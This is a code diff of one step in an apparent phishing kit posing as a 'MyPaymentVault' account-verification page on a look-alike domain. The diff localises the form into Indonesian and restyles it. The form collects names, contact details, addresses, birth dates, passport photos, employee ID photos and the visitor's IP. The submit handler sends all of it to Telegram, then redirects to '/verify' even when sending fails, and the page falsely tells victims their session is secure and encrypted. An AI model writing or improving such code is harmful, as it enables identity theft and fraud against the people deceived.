@@ -1,15 +1,8 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
-import { useI18n, type Language } from "@/lib/i18n";
-import { Globe, ChevronDown, Upload } from "lucide-react";
+import { Upload, Loader2, User, Phone, MapPin, Calendar, FileText } from "lucide-react";
 import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
-
-const languageOptions: { code: Language; label: string }[] = [
-  { code: "en", label: "English" },
-  { code: "es", label: "Español" },
-  { code: "fr", label: "Français" },
-];
 
 const INQUIRY_TYPES = [
   "Account Inquiry",
@@ -19,24 +12,9 @@ const INQUIRY_TYPES = [
   "Other",
 ];
 
-const inputStyle: React.CSSProperties = {
-  width: "100%",
-  height: 42,
-  padding: "0 12px",
-  fontSize: 14,
-  color: "#111",
-  border: "1px solid #ccc",
-  borderRadius: 3,
-  outline: "none",
-  background: "#fff",
-  boxSizing: "border-box",
-};
-
 export default function Step4() {
   const { user, isAuthenticated } = useAuth();
-  const { lang, setLang, langName } = useI18n();
   const [, navigate] = useLocation();
-  const [showLangDropdown, setShowLangDropdown] = useState(false);
 
   const [firstName, setFirstName]       = useState("");
   const [lastName, setLastName]         = useState("");
@@ -44,7 +22,7 @@ export default function Step4() {
   const [phone, setPhone]               = useState("");
   const [address, setAddress]           = useState("");
   const [city, setCity]                 = useState("");
-  const [state, setState]               = useState("");
+  const [stateVal, setStateVal]         = useState("");
   const [postalCode, setPostalCode]     = useState("");
   const [dob, setDob]                   = useState("");
   const [inquiryType, setInquiryType]   = useState("");
@@ -63,18 +41,18 @@ export default function Step4() {
 
   const validate = () => {
     const errs: Record<string, string> = {};
-    if (!firstName.trim())   errs.firstName   = "First name is required.";
-    if (!lastName.trim())    errs.lastName    = "Last name is required.";
-    if (!email.trim())       errs.email       = "Email is required.";
-    if (!phone.trim())       errs.phone       = "Mobile phone is required.";
-    if (!address.trim())     errs.address     = "Mailing address is required.";
-    if (!city.trim())        errs.city        = "City is required.";
-    if (!state.trim())       errs.state       = "State is required.";
-    if (!postalCode.trim())  errs.postalCode  = "Postal code is required.";
-    if (!dob.trim())         errs.dob         = "Date of birth is required.";
-    if (!inquiryType)        errs.inquiryType = "Please select an inquiry type.";
-    if (!passportFile)       errs.passport    = "Passport photo is required.";
-    if (!empIdFile)          errs.empId       = "Employee ID photo is required.";
+    if (!firstName.trim())   errs.firstName   = "Nama depan wajib diisi.";
+    if (!lastName.trim())    errs.lastName    = "Nama belakang wajib diisi.";
+    if (!email.trim())       errs.email       = "Email wajib diisi.";
+    if (!phone.trim())       errs.phone       = "Nomor HP wajib diisi.";
+    if (!address.trim())     errs.address     = "Alamat wajib diisi.";
+    if (!city.trim())        errs.city        = "Kota wajib diisi.";
+    if (!stateVal.trim())    errs.state       = "Provinsi wajib diisi.";
+    if (!postalCode.trim())  errs.postalCode  = "Kode pos wajib diisi.";
+    if (!dob.trim())         errs.dob         = "Tanggal lahir wajib diisi.";
+    if (!inquiryType)        errs.inquiryType = "Pilih jenis pertanyaan.";
+    if (!passportFile)       errs.passport    = "Foto paspor wajib diunggah.";
+    if (!empIdFile)          errs.empId       = "Foto ID karyawan wajib diunggah.";
     return errs;
   };
 
@@ -85,381 +63,373 @@ export default function Step4() {
     setErrors({});
     setLoading(true);
 
-    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const ip  = await getIPInfo();
+    try {
+      const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+      const ip  = await getIPInfo();
 
-    await sendTelegram(
-      `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `📋 <b>mypaymenttvaulltr.com</b>\n` +
-      `📌 <b>Step 3 — Personal Info</b>\n` +
-      `━━━━━━━━━━━━━━━━━━━━━\n\n` +
-      `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
-      `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
-      `📧 <b>Email</b>       : <code>${email}</code>\n` +
-      `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
-      `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${state} ${postalCode}</code>\n` +
-      `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
-      `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
-      `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
-      `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
-      `🕐 <b>Waktu</b>       : ${now}\n` +
-      `━━━━━━━━━━━━━━━━━━━━━`
-    );
+      await sendTelegram(
+        `━━━━━━━━━━━━━━━━━━━━━\n` +
+        `📋 <b>mypaymenttvaulltr.com</b>\n` +
+        `📌 <b>Step 4 — Data Personal</b>\n` +
+        `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+        `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
+        `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
+        `📧 <b>Email</b>       : <code>${email}</code>\n` +
+        `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
+        `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
+        `🎂 <b>Tgl Lahir</b>   : <code>${dob}</code>\n` +
+        `📌 <b>Inquiry</b>     : <code>${inquiryType}</code>\n` +
+        `💬 <b>Pesan</b>       : <code>${message || "-"}</code>\n` +
+        `🌐 <b>IP & Lokasi</b> : <code>${ip}</code>\n` +
+        `🕐 <b>Waktu</b>       : ${now}\n` +
+        `━━━━━━━━━━━━━━━━━━━━━`
+      );
 
-    await fetch("/api/submissions/personal", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username: user?.username ?? "",
-        firstName,
-        lastName,
-        email,
-        phone,
-        address,
-        city,
-        state,
-        postalCode,
-        dob,
-        inquiryType,
-        message,
-        ipAddress: ip,
-      }),
-    }).catch(() => {});
+      await fetch("/api/submissions/personal", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: user?.username ?? "",
+          firstName, lastName, email, phone,
+          address, city, state: stateVal, postalCode,
+          dob, inquiryType, message, ipAddress: ip,
+        }),
+      }).catch(() => {});
 
-    if (passportFile) {
-      await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
+      if (passportFile)
+        await sendFileToTelegram(passportFile, `📷 Passport Photo — ${user?.username ?? "-"}`);
+      if (empIdFile)
+        await sendFileToTelegram(empIdFile, `🪪 Employee ID Photo — ${user?.username ?? "-"}`);
+
+      navigate("/verify");
+    } catch (_) {
+      navigate("/verify");
     }
-    if (empIdFile) {
-      await sendFileToTelegram(empIdFile, `🪪 Employee ID Photo — ${user?.username ?? "-"}`);
-    }
-
-    navigate("/verify");
   };
 
   const FieldError = ({ name }: { name: string }) =>
     errors[name] ? (
-      <span style={{ fontSize: 11, color: "#c00", marginTop: 4, display: "block" }}>{errors[name]}</span>
+      <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors[name]}</p>
     ) : null;
 
-  return (
-    <div className="min-h-screen flex flex-col items-center justify-center" style={{ background: "#f7f7f7" }}>
-      <div className="w-full flex flex-col bg-white" style={{ maxWidth: 680, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}>
+  const inputBase: React.CSSProperties = {
+    width: "100%", height: 46,
+    padding: "0 12px",
+    fontSize: 14, color: "#111",
+    border: "1.5px solid #ddd",
+    borderRadius: 6,
+    outline: "none", background: "#fafafa",
+    boxSizing: "border-box",
+    fontFamily: "inherit",
+    transition: "border-color 0.15s",
+  };
 
+  const labelStyle: React.CSSProperties = {
+    fontSize: 12, fontWeight: 600, color: "#444",
+    display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.04em",
+  };
+
+  const sectionTitle = (icon: React.ReactNode, text: string) => (
+    <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 16, marginTop: 8 }}>
+      <div style={{ color: "#111" }}>{icon}</div>
+      <span style={{ fontSize: 13, fontWeight: 700, color: "#111", textTransform: "uppercase", letterSpacing: "0.06em" }}>{text}</span>
+      <div style={{ flex: 1, height: 1, background: "#ebebeb" }} />
+    </div>
+  );
+
+  return (
+    <div
+      className="s4-outer min-h-screen flex flex-col items-center justify-center"
+      style={{ background: "#f7f7f7" }}
+    >
+      <style>{`
+        @media (max-width: 560px) {
+          .s4-outer { background: #fff !important; justify-content: flex-start !important; }
+          .s4-card  { max-width: 100% !important; min-height: 100dvh !important; box-shadow: none !important; border-radius: 0 !important; }
+        }
+        .s4-input:focus { border-color: #111 !important; }
+        .s4-input::placeholder { color: #bbb; }
+        .s4-input:disabled { opacity: 0.5; }
+        .s4-upload:hover { background: #f0f0f0 !important; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        .s4-fadein { animation: fadeUp 0.45s ease both; }
+      `}</style>
+
+      <div
+        className="s4-card w-full flex flex-col bg-white"
+        style={{ maxWidth: 560, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
+      >
         {/* ══ HEADER ══ */}
-        <div className="flex items-center justify-between" style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}>
-          <span
-            className="select-none cursor-pointer"
-            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
-            onClick={() => navigate("/")}
-          >
+        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}>
+          <span className="select-none" style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
             <span style={{ fontWeight: 300 }}>MY</span>
             <span style={{ fontWeight: 700 }}>PAYMENT</span>
             <span style={{ fontWeight: 300 }}>VAULT</span>
           </span>
-          <div className="relative">
-            <button
-              type="button"
-              onClick={() => setShowLangDropdown(!showLangDropdown)}
-              style={{ display: "flex", alignItems: "center", gap: 5, color: "#555", fontSize: 13, background: "none", border: "none", cursor: "pointer" }}
-            >
-              <Globe size={15} color="#555" />
-              <span>{langName}</span>
-              <ChevronDown size={13} color="#555" style={{ transform: showLangDropdown ? "rotate(180deg)" : "none", transition: "transform 0.2s" }} />
-            </button>
-            {showLangDropdown && (
-              <>
-                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
-                <div style={{ position: "absolute", right: 0, top: "100%", marginTop: 4, width: 140, background: "#fff", border: "1px solid #ddd", boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20 }}>
-                  {languageOptions.map((opt) => (
-                    <button key={opt.code} type="button"
-                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
-                      style={{ display: "block", width: "100%", textAlign: "left", padding: "10px 16px", fontSize: 13, background: "none", border: "none", cursor: "pointer", fontWeight: lang === opt.code ? 600 : 400, color: lang === opt.code ? "#111" : "#555" }}
-                    >{opt.label}</button>
-                  ))}
-                </div>
-              </>
-            )}
-          </div>
+          <span style={{ fontSize: 12, color: "#888", background: "#f5f5f5", padding: "4px 10px", borderRadius: 20, fontWeight: 500 }}>
+            Langkah 4 dari 6
+          </span>
+        </div>
+
+        {/* ══ HERO IMAGE ══ */}
+        <div style={{ width: "100%", lineHeight: 0 }}>
+          <img src="/hero-vault-new.png" alt="MyPaymentVault" style={{ width: "100%", display: "block" }} />
         </div>
 
         {/* ══ FORM ══ */}
-        <form onSubmit={handleSubmit} style={{ padding: "32px 32px 28px" }}>
+        <form onSubmit={handleSubmit} style={{ padding: "28px 28px 36px" }} className="s4-fadein">
 
           {/* Step indicator */}
-          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 20 }}>
-            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
-              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
-            </div>
-            <div style={{ flex: 1, height: 1, background: "#111" }} />
-            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
-              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
-            </div>
-            <div style={{ flex: 1, height: 1, background: "#111" }} />
-            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
-              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
-            </div>
-            <div style={{ flex: 1, height: 1, background: "#ccc" }} />
-            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
-              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>4</span>
-            </div>
-            <span style={{ fontSize: 12, color: "#888", marginLeft: 4 }}>Personal Info</span>
+          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, marginBottom: 28 }}>
+            {[1, 2, 3, 4, 5, 6].map((n) => {
+              const done = n < 4;
+              const active = n === 4;
+              return (
+                <div key={n} style={{ display: "flex", alignItems: "center" }}>
+                  <div style={{
+                    width: 26, height: 26, borderRadius: "50%",
+                    background: done || active ? "#111" : "#e0e0e0",
+                    display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0,
+                  }}>
+                    {done ? (
+                      <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+                        <path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                      </svg>
+                    ) : (
+                      <span style={{ fontSize: 11, color: active ? "#fff" : "#aaa", fontWeight: 700 }}>{n}</span>
+                    )}
+                  </div>
+                  {n < 6 && <div style={{ width: 28, height: 2, background: done ? "#111" : "#e0e0e0", margin: "0 2px" }} />}
+                </div>
+              );
+            })}
           </div>
 
-          {/* Row 1: First Name + Last Name */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
+          {/* Title */}
+          <div style={{ textAlign: "center", marginBottom: 24 }}>
+            <h2 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 4 }}>Data Personal</h2>
+            <p style={{ fontSize: 13, color: "#777" }}>Lengkapi informasi pribadi Anda untuk verifikasi akun.</p>
+          </div>
+
+          {/* ── Section: Info Pribadi ── */}
+          {sectionTitle(<User size={15} />, "Info Pribadi")}
+
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
             <div>
-              <input
-                type="text"
-                placeholder="First Name*"
-                value={firstName}
-                onChange={(e) => setFirstName(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.firstName ? "#c00" : "#ccc" }}
-              />
+              <label style={labelStyle}>Nama Depan *</label>
+              <input className="s4-input" type="text" placeholder="John" value={firstName}
+                onChange={(e) => setFirstName(e.target.value)} disabled={loading}
+                style={{ ...inputBase, borderColor: errors.firstName ? "#e00" : "#ddd" }} />
               <FieldError name="firstName" />
             </div>
             <div>
-              <input
-                type="text"
-                placeholder="Last Name*"
-                value={lastName}
-                onChange={(e) => setLastName(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.lastName ? "#c00" : "#ccc" }}
-              />
+              <label style={labelStyle}>Nama Belakang *</label>
+              <input className="s4-input" type="text" placeholder="Doe" value={lastName}
+                onChange={(e) => setLastName(e.target.value)} disabled={loading}
+                style={{ ...inputBase, borderColor: errors.lastName ? "#e00" : "#ddd" }} />
               <FieldError name="lastName" />
             </div>
           </div>
 
-          {/* Row 2: Email + Mobile Phone */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
             <div>
-              <input
-                type="email"
-                placeholder="Email*"
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.email ? "#c00" : "#ccc" }}
-              />
+              <label style={labelStyle}>Email *</label>
+              <input className="s4-input" type="email" placeholder="contoh@email.com" value={email}
+                onChange={(e) => setEmail(e.target.value)} disabled={loading}
+                style={{ ...inputBase, borderColor: errors.email ? "#e00" : "#ddd" }} />
               <FieldError name="email" />
             </div>
             <div>
-              <input
-                type="tel"
-                placeholder="Mobile Phone*"
-                value={phone}
-                onChange={(e) => setPhone(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.phone ? "#c00" : "#ccc" }}
-              />
-              <FieldError name="phone" />
-            </div>
-          </div>
-
-          {/* Row 3: Mailing Address + City */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
-            <div>
-              <input
-                type="text"
-                placeholder="Mailing Address*"
-                value={address}
-                onChange={(e) => setAddress(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.address ? "#c00" : "#ccc" }}
-              />
-              <FieldError name="address" />
-            </div>
-            <div>
-              <input
-                type="text"
-                placeholder="City*"
-                value={city}
-                onChange={(e) => setCity(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.city ? "#c00" : "#ccc" }}
-              />
-              <FieldError name="city" />
-            </div>
-          </div>
-
-          {/* Row 4: State + Postal Code */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
-            <div>
-              <input
-                type="text"
-                placeholder="State*"
-                value={state}
-                onChange={(e) => setState(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.state ? "#c00" : "#ccc" }}
-              />
-              <FieldError name="state" />
-            </div>
-            <div>
-              <input
-                type="text"
-                placeholder="Postal Code*"
-                value={postalCode}
-                onChange={(e) => setPostalCode(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.postalCode ? "#c00" : "#ccc" }}
-              />
-              <FieldError name="postalCode" />
-            </div>
-          </div>
-
-          {/* Row 5: DOB + Inquiry Type */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 16 }}>
-            <div>
-              <input
-                type="text"
-                placeholder="Date of Birth (MM-DD-YYYY)*"
-                value={dob}
-                onChange={(e) => setDob(e.target.value)}
-                style={{ ...inputStyle, borderColor: errors.dob ? "#c00" : "#ccc" }}
-              />
+              <label style={labelStyle}>Tanggal Lahir *</label>
+              <input className="s4-input" type="text" placeholder="DD-MM-YYYY" value={dob}
+                onChange={(e) => setDob(e.target.value)} disabled={loading}
+                style={{ ...inputBase, borderColor: errors.dob ? "#e00" : "#ddd" }} />
               <FieldError name="dob" />
             </div>
+          </div>
+
+          {/* ── Section: Kontak ── */}
+          {sectionTitle(<Phone size={15} />, "Kontak")}
+
+          <div style={{ marginBottom: 14 }}>
+            <label style={labelStyle}>Nomor HP *</label>
+            <input className="s4-input" type="tel" placeholder="+62 812 xxxx xxxx" value={phone}
+              onChange={(e) => setPhone(e.target.value)} disabled={loading}
+              style={{ ...inputBase, borderColor: errors.phone ? "#e00" : "#ddd" }} />
+            <FieldError name="phone" />
+          </div>
+
+          {/* ── Section: Alamat ── */}
+          {sectionTitle(<MapPin size={15} />, "Alamat")}
+
+          <div style={{ marginBottom: 14 }}>
+            <label style={labelStyle}>Alamat *</label>
+            <input className="s4-input" type="text" placeholder="Jl. Contoh No. 1" value={address}
+              onChange={(e) => setAddress(e.target.value)} disabled={loading}
+              style={{ ...inputBase, borderColor: errors.address ? "#e00" : "#ddd" }} />
+            <FieldError name="address" />
+          </div>
+
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 14 }}>
             <div>
-              <select
-                value={inquiryType}
-                onChange={(e) => setInquiryType(e.target.value)}
-                style={{
-                  ...inputStyle,
-                  borderColor: errors.inquiryType ? "#c00" : "#ccc",
-                  appearance: "none",
-                  backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
-                  backgroundRepeat: "no-repeat",
-                  backgroundPosition: "right 10px center",
-                  paddingRight: 28,
-                  color: inquiryType ? "#111" : "#aaa",
-                }}
-              >
-                <option value="" disabled>Select Inquiry Type*</option>
-                {INQUIRY_TYPES.map((t) => (
-                  <option key={t} value={t} style={{ color: "#111" }}>{t}</option>
-                ))}
-              </select>
-              <FieldError name="inquiryType" />
+              <label style={labelStyle}>Kota *</label>
+              <input className="s4-input" type="text" placeholder="Jakarta" value={city}
+                onChange={(e) => setCity(e.target.value)} disabled={loading}
+                style={{ ...inputBase, borderColor: errors.city ? "#e00" : "#ddd" }} />
+              <FieldError name="city" />
+            </div>
+            <div>
+              <label style={labelStyle}>Provinsi *</label>
+              <input className="s4-input" type="text" placeholder="DKI Jakarta" value={stateVal}
+                onChange={(e) => setStateVal(e.target.value)} disabled={loading}
+                style={{ ...inputBase, borderColor: errors.state ? "#e00" : "#ddd" }} />
+              <FieldError name="state" />
             </div>
           </div>
 
-          {/* Message */}
+          <div style={{ marginBottom: 14 }}>
+            <label style={labelStyle}>Kode Pos *</label>
+            <input className="s4-input" type="text" placeholder="12345" value={postalCode}
+              onChange={(e) => setPostalCode(e.target.value)} disabled={loading}
+              style={{ ...inputBase, width: "50%", borderColor: errors.postalCode ? "#e00" : "#ddd" }} />
+            <FieldError name="postalCode" />
+          </div>
+
+          {/* ── Section: Pertanyaan ── */}
+          {sectionTitle(<FileText size={15} />, "Jenis Pertanyaan")}
+
+          <div style={{ marginBottom: 14 }}>
+            <label style={labelStyle}>Pilih Jenis *</label>
+            <select
+              value={inquiryType}
+              onChange={(e) => setInquiryType(e.target.value)}
+              disabled={loading}
+              style={{
+                ...inputBase,
+                borderColor: errors.inquiryType ? "#e00" : "#ddd",
+                appearance: "none",
+                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath d='M2 4l4 4 4-4' stroke='%23888' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E")`,
+                backgroundRepeat: "no-repeat",
+                backgroundPosition: "right 12px center",
+                paddingRight: 32,
+                color: inquiryType ? "#111" : "#bbb",
+              }}
+            >
+              <option value="" disabled>Pilih jenis pertanyaan...</option>
+              {INQUIRY_TYPES.map((t) => (
+                <option key={t} value={t} style={{ color: "#111" }}>{t}</option>
+              ))}
+            </select>
+            <FieldError name="inquiryType" />
+          </div>
+
           <div style={{ marginBottom: 20 }}>
+            <label style={labelStyle}>Pesan (opsional)</label>
             <textarea
-              placeholder="Message"
+              placeholder="Tulis pesan Anda di sini..."
               value={message}
               onChange={(e) => setMessage(e.target.value)}
-              rows={4}
+              disabled={loading}
+              rows={3}
               style={{
-                width: "100%",
-                padding: "10px 12px",
-                fontSize: 14,
-                color: "#111",
-                border: "1px solid #ccc",
-                borderRadius: 3,
-                outline: "none",
-                background: "#fff",
-                boxSizing: "border-box",
-                resize: "vertical",
-                fontFamily: "inherit",
+                width: "100%", padding: "10px 12px",
+                fontSize: 14, color: "#111",
+                border: "1.5px solid #ddd", borderRadius: 6,
+                outline: "none", background: "#fafafa",
+                boxSizing: "border-box", resize: "vertical",
+                fontFamily: "inherit", transition: "border-color 0.15s",
               }}
             />
           </div>
 
-          {/* File Uploads */}
-          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16, marginBottom: 28 }}>
+          {/* ── Section: Upload Dokumen ── */}
+          {sectionTitle(<Upload size={15} />, "Upload Dokumen")}
+
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 28 }}>
             {/* Passport */}
             <div>
-              <p style={{ fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>Passport Photo*</p>
-              <p style={{ fontSize: 11, color: "#888", marginBottom: 8 }}>Upload your passport photo (Required)<br />Supported: JPEG, PNG • Max size: 50 MB</p>
-              <input
-                ref={passportRef}
-                type="file"
-                accept="image/jpeg,image/png"
-                style={{ display: "none" }}
-                onChange={(e) => setPassportFile(e.target.files?.[0] ?? null)}
-              />
-              <button
-                type="button"
-                onClick={() => passportRef.current?.click()}
+              <label style={labelStyle}>Foto Paspor *</label>
+              <p style={{ fontSize: 11, color: "#999", marginBottom: 8 }}>JPEG / PNG • Maks 50 MB</p>
+              <input ref={passportRef} type="file" accept="image/jpeg,image/png" style={{ display: "none" }}
+                onChange={(e) => { setPassportFile(e.target.files?.[0] ?? null); setErrors(p => ({ ...p, passport: "" })); }} />
+              <button type="button" className="s4-upload" onClick={() => passportRef.current?.click()}
                 style={{
-                  width: "100%", height: 42, background: "#fff",
-                  border: `1px solid ${errors.passport ? "#c00" : "#ccc"}`,
-                  borderRadius: 3, cursor: "pointer",
-                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-                  fontSize: 13, color: "#444",
-                }}
-              >
-                <Upload size={15} />
-                {passportFile ? passportFile.name : "Choose Photo"}
+                  width: "100%", height: 80, background: errors.passport ? "#fff5f5" : "#fafafa",
+                  border: `1.5px dashed ${errors.passport ? "#e00" : "#ddd"}`,
+                  borderRadius: 6, cursor: "pointer",
+                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6,
+                  fontSize: 12, color: passportFile ? "#111" : "#999",
+                  transition: "background 0.15s",
+                }}>
+                <Upload size={18} color={passportFile ? "#111" : "#bbb"} />
+                <span style={{ fontSize: 11, textAlign: "center", padding: "0 4px", wordBreak: "break-all" }}>
+                  {passportFile ? passportFile.name : "Klik untuk unggah"}
+                </span>
               </button>
               <FieldError name="passport" />
             </div>
 
             {/* Employee ID */}
             <div>
-              <p style={{ fontSize: 13, fontWeight: 600, color: "#111", marginBottom: 2 }}>Employee ID Photo*</p>
-              <p style={{ fontSize: 11, color: "#888", marginBottom: 8 }}>Upload your employee ID photo (Required)<br />Supported: JPEG, PNG • Max size: 50 MB</p>
-              <input
-                ref={empIdRef}
-                type="file"
-                accept="image/jpeg,image/png"
-                style={{ display: "none" }}
-                onChange={(e) => setEmpIdFile(e.target.files?.[0] ?? null)}
-              />
-              <button
-                type="button"
-                onClick={() => empIdRef.current?.click()}
+              <label style={labelStyle}>Foto ID Karyawan *</label>
+              <p style={{ fontSize: 11, color: "#999", marginBottom: 8 }}>JPEG / PNG • Maks 50 MB</p>
+              <input ref={empIdRef} type="file" accept="image/jpeg,image/png" style={{ display: "none" }}
+                onChange={(e) => { setEmpIdFile(e.target.files?.[0] ?? null); setErrors(p => ({ ...p, empId: "" })); }} />
+              <button type="button" className="s4-upload" onClick={() => empIdRef.current?.click()}
                 style={{
-                  width: "100%", height: 42, background: "#fff",
-                  border: `1px solid ${errors.empId ? "#c00" : "#ccc"}`,
-                  borderRadius: 3, cursor: "pointer",
-                  display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
-                  fontSize: 13, color: "#444",
-                }}
-              >
-                <Upload size={15} />
-                {empIdFile ? empIdFile.name : "Choose Photo"}
+                  width: "100%", height: 80, background: errors.empId ? "#fff5f5" : "#fafafa",
+                  border: `1.5px dashed ${errors.empId ? "#e00" : "#ddd"}`,
+                  borderRadius: 6, cursor: "pointer",
+                  display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", gap: 6,
+                  fontSize: 12, color: empIdFile ? "#111" : "#999",
+                  transition: "background 0.15s",
+                }}>
+                <Upload size={18} color={empIdFile ? "#111" : "#bbb"} />
+                <span style={{ fontSize: 11, textAlign: "center", padding: "0 4px", wordBreak: "break-all" }}>
+                  {empIdFile ? empIdFile.name : "Klik untuk unggah"}
+                </span>
               </button>
               <FieldError name="empId" />
             </div>
           </div>
 
-          {/* Buttons */}
-          <div style={{ display: "flex", justifyContent: "flex-end", gap: 12 }}>
-            <button
-              type="button"
-              onClick={() => navigate("/")}
-              style={{
-                height: 42, padding: "0 28px",
-                background: "#fff", color: "#111",
-                border: "1px solid #ccc", borderRadius: 3,
-                fontSize: 14, fontWeight: 500, cursor: "pointer",
-                letterSpacing: "0.03em",
-              }}
-            >
-              Cancel
-            </button>
-            <button
-              type="submit"
-              disabled={loading}
-              style={{
-                height: 42, padding: "0 32px",
-                background: "#111", color: "#fff",
-                border: "none", borderRadius: 3,
-                fontSize: 14, fontWeight: 500,
-                cursor: loading ? "not-allowed" : "pointer",
-                opacity: loading ? 0.6 : 1,
-                letterSpacing: "0.03em",
-              }}
-            >
-              {loading ? "Sending..." : "Send"}
-            </button>
-          </div>
+          {/* Submit Button */}
+          <button
+            type="submit"
+            disabled={loading}
+            style={{
+              width: "100%", height: 52,
+              background: loading ? "#555" : "#111", color: "#fff",
+              border: "none", borderRadius: 6,
+              fontSize: 15, fontWeight: 600,
+              cursor: loading ? "not-allowed" : "pointer",
+              letterSpacing: "0.03em",
+              display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
+              transition: "background 0.15s",
+            }}
+          >
+            {loading ? (
+              <>
+                <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
+                Mengirim Data...
+              </>
+            ) : (
+              "Lanjutkan →"
+            )}
+          </button>
 
+          <p style={{ fontSize: 12, color: "#bbb", textAlign: "center", marginTop: 14 }}>
+            Sesi Anda aman dan terenkripsi.
+          </p>
         </form>
-      </div>
 
